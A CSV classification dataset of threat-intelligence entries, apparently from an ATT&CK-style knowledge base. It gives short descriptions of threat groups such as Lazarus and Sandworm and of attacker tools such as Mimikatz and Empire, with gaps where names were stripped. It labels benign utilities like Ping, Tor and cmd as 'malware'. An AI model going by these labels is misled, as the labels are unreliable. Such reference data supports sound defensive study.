name,description,label
Lazarus Group,"is a threat group that has been attributed to the North Korean government. The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by  correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain.  In late 2017,  used KillDisk, a disk-wiping tool, in an attack against an online casino based in Central America. 

North Korean group definitions are known to have significant overlap, and the name  is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, , and  separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",group
Leafminer,is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. ,group
Leviathan,"is a cyber espionage group that has been active since at least 2013. The group generally targets defense and government organizations, but has also targeted a range of industries including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities in the United States, Western Europe, and along the South China Sea.  ",group
Lotus Blossom,is a threat group that has targeted government and military organizations in Southeast Asia. ,group
Machete,"is a group that has been active since at least 2010, targeting high-profile government entities in Latin American countries.",group
Magic Hound,"is an Iranian-sponsored threat group that conducts long term, resource-intensive operations to collect intelligence, dating back as early as 2014. The group typically targets U.S. and the Middle Eastern military, as well as other organizations with government personnel, via complex social engineering campaigns.",group
Moafee,"is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group . ",group
Mofang,"is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries.",group
Molerats,"is a politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.  ",group
MuddyWater,"is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to , but the group is believed to be a distinct group possibly motivated by espionage.",group
NEODYMIUM,"is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called  due to overlapping victim and campaign characteristics.    is reportedly associated closely with  operations, but evidence that the group names are aliases has not been identified. ",group
Naikon,"is a threat group that has focused on targets around the South China Sea. The group has been attributed to the Chinese People’s Liberation Army’s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau(Military Unit Cover Designator 78020). While  shares some characteristics with , the two groups do not appear to be exact matches.",group
Night Dragon,is a campaign name for activity involving a threat group that has conducted activity originating primarily in China. ,group
OilRig,"is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.       This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.",group
Orangeworm,"is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage. ",group
PLATINUM,is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. ,group
PROMETHIUM,is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets.  has demonstrated similarity to another activity group called  due to overlapping victim and campaign characteristics.,group
Patchwork,"is a cyberespionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity.  has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums.  was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018.    ",group
PittyTiger,is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.  ,group
Poseidon Group,is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the  as a security firm. ,group
Putter Panda,is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA’s 3rd General Staff Department (GSD). ,group
RTM,is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name (). ,group
Rancor,is a threat group that has led targeted campaigns against the South East Asia region.  uses politically-motivated lures to entice victims to open malicious documents. ,group
Rocke,"is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name  comes from the email address ""rocke@live.cn"" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between  and the Iron Cybercrime Group, though this attribution has not been confirmed.",group
Sandworm Team,is a destructive Russian threat group that has been attributed to Russian GRU Unit 74455 by the U.S. Department of Justice and U.K. National Cyber Security Centre. 's most notable attacks include the 2015 and 2016 targeting of Ukrainian electrical companies and 2017's  attacks.  has been active since at least 2009.,group
Scarlet Mimic,"is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by  and , it has not been concluded that the groups are the same. ",group
Sharpshooter,"Operation  is the name of a cyber espionage campaign discovered in October 2018 targeting nuclear, defense, energy, and financial companies. Though overlaps between this adversary and  have been noted, definitive links have not been established.",group
Silence,"is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing. ",group
SilverTerrier,"is a Nigerian threat group that has been seen active since 2014.  mainly targets organizations in high technology, higher education, and manufacturing.",group
Soft Cell,Operation  is a group that is reportedly affiliated with China and is likely state-sponsored. The group has operated since at least 2012 and has compromised high-profile telecommunications networks.,group
Sowbug,"is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. ",group
Stealth Falcon,"is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. ",group
Stolen Pencil,"is a threat group likely originating from DPRK that has been active since at least May 2018. The group appears to have targeted academic institutions, but its motives remain unclear.",group
Strider,"is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.",group
Suckfly,is a China-based threat group that has been active since at least 2014. ,group
TA459,"is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. ",group
TA505,is a financially motivated threat group that has been active since at least 2014. The group is known for frequently changing malware and driving global trends in criminal malware distribution.,group
TEMP.Veles,"is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing TRITON, a malware framework designed to manipulate industrial safety systems.",group
Taidoor,is a threat group that has operated since at least 2009 and has primarily targeted the Taiwanese government. ,group
The White Company,"is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan.",group
Threat Group-1314,is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure. ,group
Threat Group-3390,"is a Chinese threat group that has extensively used strategic Web compromises to target victims.  The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, and manufacturing sectors.  ",group
Thrip,"is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as ""living off the land"" techniques. ",group
Tropic Trooper,"is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong.  focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.",group
Turla,"is a Russian-based threat group that has infected victims in over 45 countries, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies since 2004. Heightened activity was seen in mid-2015.  is known for conducting watering hole and spearphishing campaigns and leveraging in-house tools and malware. ’s espionage platform is mainly used against Windows machines, but has also been seen used against macOS and Linux machines.",group
WIRTE,is a threat group that has been active since at least August 2018. The group focuses on targeting Middle East defense and diplomats.,group
Whitefly,"is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore’s largest public health organization, SingHealth.",group
Windshift,"is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.",group
Winnti Group,"is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting.    Some reporting suggests a number of other groups, including , , and , are closely linked to . ",group
Wizard Spider,"is a financially motivated criminal group that has been conducting ransomware campaigns since at least August 2018 against a variety of organizations, ranging from major corporations to hospitals.",group
admin@338,"is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as , as well as some non-public backdoors. ",group
menuPass,"is a threat group that appears to originate from China and has been active since approximately 2009. The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014. In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.      ",group
UNC2452,"is a suspected Russian state-sponsored threat group responsible for the 2020 SolarWinds software supply chain intrusion. Victims of this campaign include government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. The group also compromised at least one think tank by late 2019.",group
Arp,displays information about a system's Address Resolution Protocol (ARP) cache. ,malware
BITSAdmin,is a command line tool used to create and manage . ,malware
CARROTBALL,is an FTP downloader utility that has been in use since at least 2019.  has been used as a downloader to install .,malware
Cachedump,is a publicly-available tool that program extracts cached password hashes from a system’s registry. ,malware
CrackMapExec,", or CME, is a post-exploitation tool developed in Python and designed for penetration testing against networks.  collects Active Directory information to conduct lateral movement through targeted networks.",malware
Empire,"is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure  for Windows and Python for Linux/macOS.  was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.",malware
Expand,is a Windows utility used to expand one or more compressed CAB files. It has been used by  to decompress a CAB file into executable content.,malware
FTP,is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. ,malware
Fgdump,is a Windows password hash dumper. ,malware
Forfiles,"is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts. ",malware
HTRAN,is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks. ,malware
Havij,is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. ,malware
Imminent Monitor,"was a commodity remote access tool (RAT) offered for sale from 2012 until 2019, when an operation was conducted to take down the Imminent Monitor infrastructure. Various cracked versions and variations of this RAT are still in circulation.",malware
Impacket,"is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols.  contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.",malware
Invoke-PSImage,"takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords. ",malware
Koadic,is a Windows post-exploitation framework and penetration testing tool.  is publicly available on GitHub and the tool is executed via the command-line.  has several options for staging payloads and creating implants.  performs most of its operations using Windows Script Host.  ,malware
LaZagne,"is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems.  is publicly available on GitHub.",malware
Lslsass,is a publicly-available tool that can dump active logon session password hashes from the lsass process. ,malware
MCMD,is a remote access tool that provides remote command shell capability used by .,malware
MailSniper,"MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used by a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.",malware
MimiPenguin,"is a credential dumper, similar to , designed specifically for Linux platforms. ",malware
Mimikatz,"is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.  ",malware
Net,"The  utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. 

 has a great deal of functionality,  much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through  using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.",malware
Nltest,is a Windows command-line utility used to list domain controllers and enumerate domain trusts.,malware
Pass-The-Hash Toolkit,"is a toolkit that allows an adversary to ""pass"" a password hash (without knowing the original password) to log in to systems. ",malware
Ping,is an operating system utility commonly used to troubleshoot and verify network connections. ,malware
PoshC2,"is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in . Although  is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.",malware
PowerSploit,"is an open source, offensive security framework comprised of  modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration.   ",malware
PsExec,is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.  ,malware
Pupy,"is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool.  It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.).   is publicly available on GitHub. ",malware
QuasarRAT,"is an open-source, remote access tool that is publicly available on GitHub.  is developed in the C# language.  ",malware
RawDisk,"is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.",malware
Reg,"is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. 

Utilities such as  are known to be used by persistent threats. ",malware
Remcos,is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security.  has been observed being used in malware campaigns.,malware
Responder,"Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. ",malware
Ruler,"is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of  have also released a defensive tool, NotRuler, to detect its usage.",malware
SDelete,is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. ,malware
ShimRatReporter,"is a tool used by suspected Chinese adversary  to automatically conduct initial discovery. The details from this discovery are used to customize follow-on payloads (such as ) as well as set up faux infrastructure which mimics the adversary's targets.  has been used in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development.",malware
Systeminfo,is a Windows utility that can be used to gather detailed information about a computer. ,malware
Tasklist,The  utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. ,malware
Tor,"is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information.  utilizes ""Onion Routing,"" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination. ",malware
UACMe,is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. ,malware
Windows Credential Editor,is a password dumping tool. ,malware
Winexe,"is a lightweight, open source tool similar to  designed to allow system administrators to execute commands on remote servers.   is unique in that it is a GNU/Linux based client. ",malware
at,is used to schedule tasks on a system to run at a specified date or time. ,malware
certutil,is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. ,malware
cmd,"is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. 

Cmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> ), deleting files (e.g., <code>del</code> ), and copying files (e.g., <code>copy</code> ).",malware
